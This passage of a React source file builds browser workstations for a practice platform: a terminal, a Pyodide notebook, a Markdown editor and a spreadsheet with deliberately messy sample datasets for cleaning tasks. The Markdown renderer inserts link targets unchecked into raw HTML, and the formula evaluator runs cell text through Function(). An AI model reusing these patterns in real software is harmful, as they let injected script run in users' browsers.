        setInput("")
        return
      }
      output = result ?? ""
    }

    setHistory(h => [
      ...h,
      { type: "input",  text: `$ ${trimmed}` },
      { type: "output", text: output },
    ])
    // Append to code editor so submission includes the command session
    onCodeChange((code ? code + "\n" : "") + `$ ${trimmed}\n${output}`)
    setInput("")
  }

  const handleKey = (e) => {
    if (e.key === "Enter") { runCommand(input); return }
    if (e.key === "ArrowUp") {
      const next = Math.min(cmdIdx + 1, cmdHistory.length - 1)
      setCmdIdx(next)
      setInput(cmdHistory[next] || "")
    }
    if (e.key === "ArrowDown") {
      const next = Math.max(cmdIdx - 1, -1)
      setCmdIdx(next)
      setInput(next === -1 ? "" : cmdHistory[next] || "")
    }
  }

  return (
    <div
      style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0, background: "#FAFAFA", cursor: "text" }}
      onClick={() => inputRef.current?.focus()}
    >
      <PanelHeader color="#4EC9B0" bg="#161B22">Terminal</PanelHeader>
      <div style={{ flex: 1, overflow: "auto", padding: "10px 14px", fontFamily: "monospace", fontSize: 12 }}>
        {history.map((line, i) => (
          <div key={i} style={{
            color: line.type === "input" ? "#4EC9B0" : line.type === "system" ? "#6A9955" : "#D4D4D4",
            marginBottom: 2, lineHeight: 1.5, whiteSpace: "pre-wrap",
          }}>{line.text}</div>
        ))}
        <div ref={bottomRef} />
      </div>
      <div style={{ display: "flex", gap: 0, borderTop: "1px solid #30363D", padding: "6px 14px", background: "#161B22", flexShrink: 0 }}>
        <span style={{ color: "#4EC9B0", fontFamily: "monospace", fontSize: 12, lineHeight: "24px", marginRight: 8 }}>$</span>
        <input
          ref={inputRef}
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={handleKey}
          style={{
            flex: 1, background: "transparent", border: "none", outline: "none",
            color: "#D4D4D4", fontFamily: "monospace", fontSize: 12,
          }}
          placeholder="type a command…"
          autoFocus
        />
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. NOTEBOOK WORKSTATION — real Python (Pyodide: pandas + matplotlib)
// ─────────────────────────────────────────────────────────────────────────────
function NotebookWorkstation({ mission, code, onCodeChange }) {
  const [preview, setPreview]   = useState(null)   // { columns, values, rowCount }
  const [output, setOutput]     = useState(null)   // { stdout, error, images }
  const [running, setRunning]   = useState(false)
  const [status, setStatus]     = useState(null)
  const [engineErr, setEngineErr] = useState(null)

  useEffect(() => {
    let alive = true
    runQuery(mission, "SELECT * FROM orders LIMIT 6")
      .then(out => { if (alive) setPreview(out.resultSets[0]) })
      .catch(e => { if (alive) setEngineErr(e.message) })
    return () => { alive = false }
  }, [mission])

  const runCell = async () => {
    if (!code?.trim() || running) return
    setRunning(true); setOutput(null)
    try {
      const out = await runPython(mission, code, setStatus)
      setOutput(out)
    } catch (e) {
      setOutput({ stdout: "", error: `Python runtime failed to load: ${e.message}`, images: [] })
    }
    setStatus(null); setRunning(false)
  }

  // ── shell action bus: ▶ Run Cells + proof draft ──
  const busRef = useRef({})
  busRef.current = { runCell, code, output }
  useEffect(() => {
    const unRun = registerRunner(() => busRef.current.runCell())
    const unProof = registerProofProvider(() => {
      const { code: c, output: o } = busRef.current
      const artifacts = []
      if (c?.trim()) artifacts.push({ type: "code", label: "Notebook cell (Python)", content: c })
      if (o?.stdout) artifacts.push({ type: "report", label: "Cell output", content: o.stdout.slice(0, 2000) })
      ;(o?.images || []).forEach((img, i) =>
        artifacts.push({ type: "image", label: `Figure ${i + 1}`, content: `data:image/png;base64,${img}` }))
      return { headline: mission?.title || "Notebook analysis", artifacts }
    })
    return () => { unRun(); unProof() }
  }, []) // eslint-disable-line

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0 }}>
      {/* Data preview — real rows from the mission database */}
      <div style={{ flex: "0 0 32%", borderBottom: `1px solid ${T.border}`, overflow: "hidden", display: "flex", flexDirection: "column" }}>
        <PanelHeader color={T.amber}>📊 Dataset — preloaded as `df` (pd.read_csv('/data/orders.csv'))</PanelHeader>
        <div style={{ overflow: "auto", flex: 1 }}>
          {engineErr && <div style={{ padding: 12, fontSize: 11, color: T.red }}>Dataset failed to load: {engineErr}</div>}
          {!preview && !engineErr && <div style={{ padding: 12, fontSize: 11, color: T.ink3 }}>Loading dataset…</div>}
          {preview && (
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 11 }}>
              <thead>
                <tr style={{ background: T.bg2 }}>
                  {preview.columns.map(c => <th key={c} style={{ padding: "4px 8px", textAlign: "left", fontWeight: 700, color: T.ink2, borderBottom: `1px solid ${T.border}`, whiteSpace: "nowrap" }}>{c}</th>)}
                </tr>
              </thead>
              <tbody>
                {preview.values.map((row, i) => (
                  <tr key={i} style={{ borderBottom: `1px solid ${T.border}`, background: i % 2 ? T.bg : T.bg2 }}>
                    {row.map((cell, ci) => <td key={ci} style={{ padding: "3px 8px", color: cell === null ? T.red : T.ink2, whiteSpace: "nowrap" }}>{formatCell(cell)}</td>)}
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>

      {/* Code cell */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
        <PanelHeader color={T.green} actions={[
          <SmallBtn key="run" active onClick={runCell} color={T.green}>{running ? "⟳ Running…" : "▶ Run Cell"}</SmallBtn>
        ]}>Python Cell — real CPython via Pyodide</PanelHeader>
        <div style={{ flex: "0 0 48%", overflow: "hidden" }}>
          <MonoTextarea
            value={code}
            onChange={onCodeChange}
            placeholder={"# df is already loaded from /data/orders.csv\n# This is REAL Python — pandas & matplotlib included. Use print() to see output.\n\nprint(df.head())\nprint(df.describe())\n\n# TODO: your analysis here\n# plt.plot(...) figures render below automatically"}
          />
        </div>
        {/* Output */}
        <div style={{ flex: 1, borderTop: `1px solid ${T.border}`, overflow: "auto", background: T.bg }}>
          <PanelHeader color={output?.error ? T.red : T.ink3}>
            {running ? (status || "⟳ Running…") : output ? (output.error ? "✗ Traceback" : "Output") : "No output yet — first run downloads the Python runtime (~15 MB, cached afterwards)"}
          </PanelHeader>
          {output && !running && (
            <div style={{ padding: "8px 12px" }}>
              {output.stdout && (
                <pre style={{ margin: 0, fontFamily: "monospace", fontSize: 11, color: T.ink2, whiteSpace: "pre-wrap", lineHeight: 1.5 }}>{output.stdout}</pre>
              )}
              {output.error && (
                <pre style={{ margin: "6px 0 0", fontFamily: "monospace", fontSize: 11, color: T.red, whiteSpace: "pre-wrap", lineHeight: 1.5 }}>{output.error}</pre>
              )}
              {(output.images || []).map((img, i) => (
                <img key={i} src={`data:image/png;base64,${img}`} alt={`figure ${i + 1}`} style={{ maxWidth: "100%", marginTop: 8, border: `1px solid ${T.border}`, borderRadius: 6 }} />
              ))}
              {!output.stdout && !output.error && !(output.images || []).length && (
                <div style={{ fontSize: 11, color: T.ink3 }}>Code ran with no output — use print() or create a matplotlib figure.</div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 6. MARKDOWN WORKSTATION  (editor + rendered preview)
// ─────────────────────────────────────────────────────────────────────────────
function renderMarkdown(md) {
  // Very basic markdown → HTML (headings, bold, italic, code, lists, links)
  return md
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/^#{3}\s(.+)$/gm,  "<h3>$1</h3>")
    .replace(/^#{2}\s(.+)$/gm,  "<h2>$1</h2>")
    .replace(/^#{1}\s(.+)$/gm,  "<h1>$1</h1>")
    .replace(/\*\*(.+?)\*\*/g,  "<strong>$1</strong>")
    .replace(/\*(.+?)\*/g,      "<em>$1</em>")
    .replace(/`(.+?)`/g,        "<code style='background:#f3f3f3;padding:1px 4px;border-radius:3px;font-family:monospace'>$1</code>")
    .replace(/^[-*]\s(.+)$/gm,  "<li>$1</li>")
    .replace(/\[(.+?)\]\((.+?)\)/g, "<a href='$2' target='_blank'>$1</a>")
    .replace(/\n{2,}/g, "<br/><br/>")
}

function MarkdownWorkstation({ mission, code, onCodeChange }) {
  const [view, setView] = useState("split")

  const editorVisible  = view !== "preview"
  const previewVisible = view !== "editor"

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0 }}>
      <PanelHeader color={T.ink2} actions={[
        <SmallBtn key="split"   active={view==="split"}   onClick={() => setView("split")}   color={T.ink}>Split</SmallBtn>,
        <SmallBtn key="editor"  active={view==="editor"}  onClick={() => setView("editor")}  color={T.ink}>Editor</SmallBtn>,
        <SmallBtn key="preview" active={view==="preview"} onClick={() => setView("preview")} color={T.ink}>Preview</SmallBtn>,
      ]}>Markdown Workstation</PanelHeader>

      <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>
        {editorVisible && (
          <div style={{ flex: 1, overflow: "hidden", borderRight: previewVisible ? `1px solid ${T.border}` : "none" }}>
            <MonoTextarea
              value={code}
              onChange={onCodeChange}
              placeholder={"# Title\n\nWrite your markdown here...\n\n## Section\n\n- Item 1\n- Item 2"}
            />
          </div>
        )}
        {previewVisible && (
          <div style={{ flex: 1, overflow: "auto", padding: "16px 20px", background: "#ffffff", fontFamily: "Georgia, serif", fontSize: 14, lineHeight: 1.7, color: T.ink }}>
            {code
              ? <div dangerouslySetInnerHTML={{ __html: renderMarkdown(code) }} />
              : <div style={{ color: T.ink3, fontSize: 12, fontStyle: "italic" }}>Preview will appear here…</div>
            }
          </div>
        )}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 7. EXCEL WORKSTATION  (grid + formula bar + pivot simulation)
// ─────────────────────────────────────────────────────────────────────────────
const EXCEL_COLS = ["A","B","C","D","E","F","G","H"]
const EXCEL_ROWS = 12

// ── Raw messy dataset for Data Analyst missions ──────────────────────────────
// Rows have nulls, duplicates, wrong types, inconsistent casing — deliberate issues to clean
const buildMessynRawData = (mission) => {
  // Try to derive company/scenario from mission title, fallback to generic
  const title = mission?.title || ""
  const isEcom   = /order|swiggy|zomato|flipkart|meesho|commerce/i.test(title)
  const isFintech = /payment|razorpay|phonepe|churn|fintech|loan/i.test(title)
  const isSaaS   = /saas|subscription|conversion|retention|funnel/i.test(title)

  // Pick column schema based on scenario
  if (isEcom) return {
    headers: ["order_id","customer_id","city","category","amount","status","order_date","delivery_days"],
    rows: [
      ["ORD001","CUST_101","Bangalore","Electronics","4599","Delivered","2024-03-01","3"],
      ["ORD002","CUST_102","mumbai","Electronics","NULL","Delivered","2024-03-01","2"],
      ["ORD003","CUST_103","Delhi","Fashion","1299","Cancelled","2024-03-02",""],
      ["ORD001","CUST_101","Bangalore","Electronics","4599","Delivered","2024-03-01","3"],  // duplicate
      ["ORD004","CUST_104","Chennai","groceries","899","Delivered","2024-03-02","1"],
      ["ORD005","","Hyderabad","Fashion","2199","Delivered","2024-03-03","4"],             // missing customer_id
      ["ORD006","CUST_106","Pune","Electronics","NULL","Returned","2024-03-03",""],
      ["ORD007","CUST_107","BANGALORE","Groceries","649","Delivered","03-04-2024","2"],    // inconsistent date format
      ["ORD008","CUST_108","Mumbai","Fashion","3499","Delivered","2024-03-04","5"],
      ["ORD009","CUST_109","Delhi","Electronics","8999","Delivered","2024-03-05","3"],
      ["ORD010","CUST_110","bangalore","groceries","499","Cancelled","2024-03-05",""],
      ["ORD011","CUST_111","Chennai","Electronics","5299","Delivered","2024-03-06","2"],
      ["ORD012","CUST_112","Hyderabad","Fashion","NULL","Returned","2024-03-06","6"],
      ["ORD013","CUST_113","Pune","Groceries","799","Delivered","2024-03-07","1"],
      ["ORD014","CUST_114","Mumbai","Electronics","12499","Delivered","2024-03-07","3"],
    ],
    issues: ["2 duplicate rows (ORD001)","3 NULL amounts","1 missing customer_id","Inconsistent city casing (BANGALORE vs Bangalore)","Inconsistent date format (03-04-2024)","Inconsistent category casing (groceries vs Groceries)"],
    tasks: ["Remove duplicate order IDs","Handle NULL amounts (fill with median or drop)","Standardise city names to Title Case","Fix date format to YYYY-MM-DD","Standardise category names","Add a revenue_flag column: 'High' if amount > 3000 else 'Low'","Calculate % of Delivered vs Cancelled orders"],
  }
  if (isFintech) return {
    headers: ["txn_id","user_id","merchant","amount","status","payment_method","txn_date","response_time_ms"],
    rows: [
      ["TXN001","U_201","Razorpay","5000","Success","UPI","2024-03-01","320"],
      ["TXN002","U_202","PhonePe","NULL","Failed","Card","2024-03-01","8900"],
      ["TXN003","U_203","Paytm","1500","Success","UPI","2024-03-02","410"],
      ["TXN001","U_201","Razorpay","5000","Success","UPI","2024-03-01","320"],   // duplicate
      ["TXN004","","Razorpay","3200","Failed","Netbanking","2024-03-02",""],     // missing user_id
      ["TXN005","U_205","paytm","800","success","upi","03-03-2024","290"],       // casing + date issues
      ["TXN006","U_206","PhonePe","NULL","Failed","Card","2024-03-03","12000"],
      ["TXN007","U_207","Razorpay","9999","Success","UPI","2024-03-04","380"],
      ["TXN008","U_208","PAYTM","2400","Failed","Card","2024-03-04",""],
      ["TXN009","U_209","PhonePe","1800","Success","UPI","2024-03-05","290"],
      ["TXN010","U_210","Razorpay","NULL","Failed","Netbanking","2024-03-05","9500"],
      ["TXN011","U_211","Paytm","4200","Success","Card","2024-03-06","440"],
      ["TXN012","U_212","PhonePe","600","Failed","UPI","2024-03-06","8800"],
      ["TXN013","U_213","Razorpay","15000","Success","NEFT","2024-03-07","520"],
      ["TXN014","U_214","Paytm","350","Success","UPI","2024-03-07","310"],
    ],
    issues: ["1 duplicate transaction (TXN001)","3 NULL amounts","1 missing user_id","Inconsistent merchant casing (paytm vs Paytm vs PAYTM)","Inconsistent status casing (success vs Success)","Wrong date format (03-03-2024)","Missing response_time_ms values"],
    tasks: ["Remove duplicate TXN IDs","Handle NULL amounts","Standardise merchant & status to Title Case","Fix date format","Flag suspicious response times > 5000ms as 'Timeout'","Calculate failure rate per payment method","Add a column: 'High Value' if amount > 5000"],
  }
  // Default SaaS subscription data
  return {
    headers: ["user_id","plan","signup_date","mrr","status","country","sessions_last_30d","nps_score"],
    rows: [
      ["U_301","Pro","2024-01-05","2999","Active","India","24","8"],
      ["U_302","Free","2024-01-08","0","Churned","India","0",""],
      ["U_303","Enterprise","2024-01-10","NULL","Active","India","45","9"],
      ["U_301","Pro","2024-01-05","2999","Active","India","24","8"],         // duplicate
      ["U_304","free","2024-01-12","0","active","india","3","6"],            // casing issues
      ["U_305","Pro","08-01-2024","2999","Active","","18","7"],              // bad date, missing country
      ["U_306","Enterprise","2024-01-15","14999","Active","India","NULL","10"],
      ["U_307","Pro","2024-01-18","2999","Churned","India","0","3"],
      ["U_308","Free","2024-01-20","0","Active","India","1",""],
      ["U_309","PRO","2024-01-22","2999","active","INDIA","12","7"],
      ["U_310","Enterprise","2024-01-25","NULL","Active","India","52","9"],
      ["U_311","Pro","2024-01-28","2999","Active","India","20","8"],
      ["U_312","Free","2024-02-01","0","Churned","India","0","2"],
      ["U_313","Enterprise","2024-02-03","14999","Active","India","38","10"],
      ["U_314","Pro","2024-02-05","2999","Active","India","15","7"],
    ],
    issues: ["1 duplicate user (U_301)","2 NULL MRR values","1 NULL sessions value","Inconsistent plan casing (free vs Free, PRO vs Pro)","Inconsistent status casing","Inconsistent country casing","Wrong date format (08-01-2024)","Missing NPS scores"],
    tasks: ["Remove duplicate user IDs","Handle NULL MRR (Enterprise plan = 14999, Pro = 2999)","Handle NULL sessions (fill with 0)","Standardise all text columns to Title Case","Fix date format to YYYY-MM-DD","Calculate churn rate by plan","Add a column: 'At Risk' if sessions_last_30d < 5 and status = Active"],
  }
}

const defaultExcelData = () => {
  const d = {}
  d["A1"] = "order_id"; d["B1"] = "customer_id"; d["C1"] = "city"
  d["D1"] = "category"; d["E1"] = "amount";       d["F1"] = "status"; d["G1"] = "order_date"
  const rows = [
    ["ORD001","CUST_101","Bangalore","Electronics","4599","Delivered","2024-03-01"],
    ["ORD002","CUST_102","mumbai","Electronics","NULL","Delivered","2024-03-01"],
    ["ORD003","CUST_103","Delhi","Fashion","1299","Cancelled","2024-03-02"],
    ["ORD001","CUST_101","Bangalore","Electronics","4599","Delivered","2024-03-01"],
    ["ORD004","CUST_104","Chennai","groceries","899","Delivered","2024-03-02"],
    ["ORD005","","Hyderabad","Fashion","2199","Delivered","2024-03-03"],
    ["ORD006","CUST_106","Pune","Electronics","NULL","Returned","2024-03-03"],
    ["ORD007","CUST_107","BANGALORE","Groceries","649","Delivered","03-04-2024"],
  ]
  rows.forEach((r, i) => {
    const cols = ["A","B","C","D","E","F","G"]
    r.forEach((v, j) => { d[`${cols[j]}${i+2}`] = v })
  })
  return d
}

function evalFormula(formula, cells) {
  if (!formula.startsWith("=")) return formula
  try {
    let expr = formula.slice(1)
    // Resolve cell refs like C2, D6
    expr = expr.replace(/([A-H])(\d+)/g, (_, col, row) => {
      const val = cells[`${col}${row}`] || "0"
      return evalFormula(val.toString(), cells)
    })
    // SUM(range)
    expr = expr.replace(/SUM\(([A-H])(\d+):([A-H])(\d+)\)/gi, (_, c1, r1, c2, r2) => {
      let sum = 0
      for (let r = parseInt(r1); r <= parseInt(r2); r++) {
        const v = parseFloat(evalFormula((cells[`${c1}${r}`] || "0").toString(), cells))
        if (!isNaN(v)) sum += v
      }
      return sum
    })
    // ROUND
    expr = expr.replace(/ROUND\((.+),(\d+)\)/gi, (_, val, dec) => {
      return parseFloat(parseFloat(val).toFixed(parseInt(dec)))
    })
    // eslint-disable-next-line no-new-func
    const result = Function(`"use strict"; return (${expr})`)()
    return isNaN(result) ? formula : result
  } catch {
    return formula
  }
}

function ExcelWorkstation({ mission, code, onCodeChange }) {
  const rawData = buildMessynRawData(mission)
  const initRows = () => rawData.rows.map(r => [...r])

  const [rows, setRows]             = useState(initRows)
  const [headers]                   = useState(rawData.headers)
  const [selected, setSelected]     = useState(null)   // [ri, ci]
  const [editVal, setEditVal]       = useState("")
  const [editing, setEditing]       = useState(false)
  const [resolvedIssues, setResolved] = useState([])
  const [activeTab, setActiveTab]   = useState("raw") // raw | clean | stats

  // Rows that have data issues (NULL, empty key fields, duplicate IDs, bad dates)
  const issueRowIdx = (() => {
    const seen = {}
    const idxSet = new Set()
    rows.forEach((r, i) => {
      r.forEach(cell => {
        if (cell === "NULL" || cell === "") idxSet.add(i)
      })
      // duplicate first col
      const id = r[0]
      if (seen[id]) { idxSet.add(i); idxSet.add(seen[id]) }
      else seen[id] = i
      // bad date format (not YYYY-MM-DD)
      r.forEach(cell => {
        if (/^\d{2}-\d{2}-\d{4}$/.test(cell)) idxSet.add(i)
      })
    })
    return idxSet
  })()

  const serializeToCode = (updatedRows) => {
    const lines = [headers.join(",")]
    updatedRows.forEach(r => lines.push(r.map(c => c === "" ? "NULL" : c).join(",")))
    onCodeChange(
      `## Cleaned Dataset\n\`\`\`csv\n${lines.join("\n")}\n\`\`\`\n\n` +
      `## Issues Resolved\n${resolvedIssues.map(i => `- ✓ ${i}`).join("\n") || "None yet"}\n\n` +
      `## Cleaning Notes\n[Describe your data cleaning steps here]`
    )
  }

  const commitEdit = (ri, ci, val) => {
    const updated = rows.map((r, i) => i === ri ? r.map((c, j) => j === ci ? val : c) : r)
    setRows(updated)
    setEditing(false)
    serializeToCode(updated)
  }

  const selectCell = (ri, ci) => {
    setSelected([ri, ci])
    setEditVal(rows[ri][ci])
    setEditing(false)
  }

  const toggleIssue = (issue) => {
    setResolved(prev => prev.includes(issue) ? prev.filter(i => i !== issue) : [...prev, issue])
  }

  // Quick-fix helpers
  const removeDuplicates = () => {
    const seen = new Set()
    const deduped = rows.filter(r => {
      if (seen.has(r[0])) return false
      seen.add(r[0]); return true
    })
    setRows(deduped)
    serializeToCode(deduped)
  }

  const standardiseCase = () => {
    const updated = rows.map(r => r.map((cell, ci) => {
      if (ci === 0 || /^\d/.test(cell) || cell === "NULL" || cell === "") return cell
      // Title-case text fields
      const numericish = /^[\d.]+$/.test(cell)
      if (numericish) return cell
      return cell.charAt(0).toUpperCase() + cell.slice(1).toLowerCase()
    }))
    setRows(updated)
    serializeToCode(updated)
  }

  const fixDates = () => {
    const updated = rows.map(r => r.map(cell => {
      // dd-mm-yyyy → yyyy-mm-dd
      const m = cell.match(/^(\d{2})-(\d{2})-(\d{4})$/)
      if (m) return `${m[3]}-${m[2]}-${m[1]}`
      return cell
    }))
    setRows(updated)
    serializeToCode(updated)
  }

  // Stats for the Stats tab
  const stats = (() => {
    const nullCount = rows.reduce((s, r) => s + r.filter(c => c === "NULL" || c === "").length, 0)
    const seen = {}; let dupes = 0
    rows.forEach(r => { const id = r[0]; if (seen[id]) dupes++; else seen[id] = 1 })
    const numericCols = headers.map((h, ci) => {
      const vals = rows.map(r => parseFloat(r[ci])).filter(v => !isNaN(v))
      if (vals.length === 0) return null
      const sum = vals.reduce((a, b) => a + b, 0)
      return { col: h, count: vals.length, mean: (sum / vals.length).toFixed(1), min: Math.min(...vals), max: Math.max(...vals) }
    }).filter(Boolean)
    return { nullCount, dupes, total: rows.length, numericCols }
  })()

  const resolvedCount = resolvedIssues.length
  const totalIssues = rawData.issues.length

  return (
    <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>
      {/* Left panel — issues + tasks */}
      <div style={{ width: 220, flexShrink: 0, borderRight: `1px solid ${T.border}`, display: "flex", flexDirection: "column", background: "#FAFAFA", overflow: "hidden" }}>
        <div style={{ padding: "10px 12px 6px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
          <div style={{ fontSize: 11, fontWeight: 800, color: T.ink }}>🔍 Data Quality Issues</div>
          <div style={{ fontSize: 10, color: T.ink3, marginTop: 2 }}>{resolvedCount}/{totalIssues} resolved</div>
          <div style={{ height: 4, background: T.border, borderRadius: 2, marginTop: 6 }}>
            <div style={{ height: 4, background: T.green, borderRadius: 2, width: `${totalIssues ? (resolvedCount / totalIssues) * 100 : 0}%`, transition: "width 0.3s" }} />
          </div>
        </div>
        <div style={{ overflow: "auto", padding: "8px 10px", flex: 1 }}>
          {rawData.issues.map((issue, i) => {
            const done = resolvedIssues.includes(issue)
            return (
              <div key={i} onClick={() => toggleIssue(issue)} style={{
                display: "flex", gap: 7, alignItems: "flex-start", marginBottom: 7,
                padding: "6px 8px", borderRadius: 6, cursor: "pointer",
                background: done ? "#E6F4ED" : "#FFF3F3",
                border: `1px solid ${done ? "#B6DFC8" : "#F5C2C2"}`,
              }}>
                <span style={{ fontSize: 12, flexShrink: 0, marginTop: 1 }}>{done ? "✅" : "⚠️"}</span>
                <span style={{ fontSize: 10, color: done ? T.green : T.red, lineHeight: 1.4, textDecoration: done ? "line-through" : "none" }}>{issue}</span>
              </div>
            )
          })}

          <div style={{ fontSize: 10, fontWeight: 800, color: T.ink, marginTop: 12, marginBottom: 6 }}>📋 Your Tasks</div>
          {rawData.tasks.map((task, i) => (
            <div key={i} style={{ display: "flex", gap: 6, marginBottom: 5, alignItems: "flex-start" }}>
              <span style={{ fontSize: 10, color: T.ink3, flexShrink: 0, marginTop: 1 }}>{i + 1}.</span>
              <span style={{ fontSize: 10, color: T.ink2, lineHeight: 1.4 }}>{task}</span>
            </div>
          ))}

          <div style={{ marginTop: 14, display: "flex", flexDirection: "column", gap: 5 }}>
            <div style={{ fontSize: 10, fontWeight: 800, color: T.ink3, marginBottom: 2 }}>⚡ Quick Fixes</div>
            <button onClick={removeDuplicates} style={{ padding: "5px 8px", borderRadius: 6, border: `1px solid ${T.border}`, background: T.bg2, fontSize: 10, fontWeight: 700, color: T.blue, cursor: "pointer", textAlign: "left" }}>🗑 Remove Duplicates</button>
            <button onClick={standardiseCase} style={{ padding: "5px 8px", borderRadius: 6, border: `1px solid ${T.border}`, background: T.bg2, fontSize: 10, fontWeight: 700, color: T.blue, cursor: "pointer", textAlign: "left" }}>Aa Standardise Casing</button>
            <button onClick={fixDates} style={{ padding: "5px 8px", borderRadius: 6, border: `1px solid ${T.border}`, background: T.bg2, fontSize: 10, fontWeight: 700, color: T.blue, cursor: "pointer", textAlign: "left" }}>📅 Fix Date Formats</button>
          </div>
        </div>
      </div>

      {/* Main area */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
        {/* Tab bar */}
        <div style={{ display: "flex", gap: 0, padding: "0 4px", borderBottom: `1px solid ${T.border}`, background: "#F0F0F0", flexShrink: 0 }}>
          {[["raw","📋 Raw Data"],["clean","✅ Cleaning Notes"],["stats","📊 Summary Stats"]].map(([id, label]) => (
            <button key={id} onClick={() => setActiveTab(id)} style={{
              padding: "5px 12px", border: "none", borderBottom: activeTab === id ? `2px solid ${T.green}` : "2px solid transparent",
              background: "transparent", fontSize: 11, fontWeight: activeTab === id ? 800 : 500,
              color: activeTab === id ? T.green : T.ink3, cursor: "pointer",
            }}>{label}</button>
          ))}
        </div>

        {activeTab === "raw" && (
          <div style={{ flex: 1, overflow: "auto" }}>
            {/* Formula bar */}
            {selected && (
              <div style={{ display: "flex", gap: 6, padding: "4px 8px", borderBottom: `1px solid ${T.border}`, background: "#FAFAFA", flexShrink: 0, alignItems: "center" }}>
                <div style={{ padding: "2px 6px", border: `1px solid ${T.border}`, borderRadius: 3, fontSize: 10, fontWeight: 700, textAlign: "center", background: T.bg2, color: T.green, whiteSpace: "nowrap" }}>
                  {headers[selected[1]]} · row {selected[0] + 1}
                </div>
                <input
                  value={editVal}
                  onChange={e => setEditVal(e.target.value)}
                  onKeyDown={e => { if (e.key === "Enter") commitEdit(selected[0], selected[1], editVal) }}
                  onFocus={() => setEditing(true)}
                  onBlur={() => { if (editing) commitEdit(selected[0], selected[1], editVal) }}
                  style={{ flex: 1, padding: "2px 8px", border: `1px solid ${T.border}`, borderRadius: 3, fontSize: 11, fontFamily: "monospace", outline: "none" }}
                  placeholder="Edit cell value"
                />
              </div>
            )}
            <table style={{ borderCollapse: "collapse", fontSize: 11, tableLayout: "auto", width: "100%" }}>
              <thead>
                <tr>
                  <th style={{ width: 28, background: "#E0E0E0", border: `1px solid #C8C8C8`, padding: "3px 6px", fontSize: 10 }}>#</th>
                  {headers.map(h => (
                    <th key={h} style={{ background: "#217346", color: "#ffffff", border: `1px solid #C8C8C8`, padding: "5px 10px", fontWeight: 700, fontSize: 10, whiteSpace: "nowrap" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {rows.map((row, ri) => {
                  const hasIssue = issueRowIdx.has(ri)
                  return (
                    <tr key={ri} style={{ background: hasIssue ? "#FFF8F0" : ri % 2 ? T.bg : T.bg2 }}>
                      <td style={{ background: "#E0E0E0", border: `1px solid #C8C8C8`, padding: "2px 5px", fontWeight: 700, fontSize: 10, color: T.ink3, textAlign: "center" }}>
                        {hasIssue ? "⚠" : ri + 1}
                      </td>
                      {row.map((cell, ci) => {
                        const isSel = selected && selected[0] === ri && selected[1] === ci
                        const isNull = cell === "NULL" || cell === ""
                        const isBadDate = /^\d{2}-\d{2}-\d{4}$/.test(cell)
                        const cellColor = isNull ? T.red : isBadDate ? T.amber : T.ink
                        return (
                          <td key={ci}
                            onClick={() => selectCell(ri, ci)}
                            onDoubleClick={() => { selectCell(ri, ci); setEditing(true) }}
                            style={{
                              border: isSel ? `2px solid ${T.green}` : `1px solid #D0D0D0`,
                              padding: "3px 8px", cursor: "cell",
                              background: isSel ? "#E8F5E9" : isNull ? "#FFF0F0" : isBadDate ? "#FFF8E8" : "inherit",
                              color: cellColor, fontWeight: isNull ? 700 : 400,
                              fontSize: 11, whiteSpace: "nowrap",
                            }}>
                            {isNull ? "NULL" : cell}
                          </td>
                        )
                      })}
                    </tr>
                  )
                })}
              </tbody>
            </table>
            <div style={{ padding: "6px 12px", background: "#F0F0F0", borderTop: `1px solid ${T.border}`, fontSize: 10, color: T.ink3 }}>
              {rows.length} rows · {headers.length} columns · Double-click a cell to edit · <span style={{ color: T.red }}>Red = NULL</span> · <span style={{ color: T.amber }}>Orange = bad format</span> · <span style={{ color: "#E0A010" }}>Yellow bg = has issue</span>
            </div>
          </div>
        )}

        {activeTab === "clean" && (
          <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
            <div style={{ padding: "8px 14px", borderBottom: `1px solid ${T.border}`, background: "#FAFAFA", flexShrink: 0 }}>
              <div style={{ fontSize: 11, fontWeight: 800, color: T.ink }}>✍️ Cleaning Notes</div>
              <div style={{ fontSize: 10, color: T.ink3, marginTop: 2 }}>Document the cleaning steps you performed and why</div>
            </div>
            <textarea
              value={
                code.includes("## Cleaning Notes")
                  ? (code.split("## Cleaning Notes\n")[1] || "").trim()
                  : ""
              }
              onChange={e => {
                const lines = [headers.join(","), ...rows.map(r => r.join(","))]
                onCodeChange(
                  `## Cleaned Dataset\n\`\`\`csv\n${lines.join("\n")}\n\`\`\`\n\n` +
                  `## Issues Resolved\n${resolvedIssues.map(i => `- ✓ ${i}`).join("\n") || "None yet"}\n\n` +
                  `## Cleaning Notes\n${e.target.value}`
                )
              }}
              placeholder={
                "Describe your cleaning steps, e.g.:\n\n" +
                "1. Removed 2 duplicate rows (ORD001) — keeping first occurrence\n" +
                "2. Filled NULL amounts with column median (₹2,199)\n" +
                "3. Standardised all city names to Title Case\n" +
                "4. Fixed date format from DD-MM-YYYY to YYYY-MM-DD\n" +
                "5. Added 'revenue_flag' column: High if amount > 3000, else Low\n\n" +
                "Final row count: 13 (removed 2 duplicates)"
              }
              style={{
                flex: 1, border: "none", outline: "none", resize: "none",
                padding: "14px 18px", fontSize: 12, lineHeight: 1.8,
                fontFamily: "Georgia, serif", color: T.ink, background: "#ffffff",
              }}
            />
          </div>
        )}

        {activeTab === "stats" && (
          <div style={{ flex: 1, overflow: "auto", padding: 16 }}>
            <div style={{ fontSize: 12, fontWeight: 800, color: T.ink, marginBottom: 12 }}>📊 Dataset Summary</div>
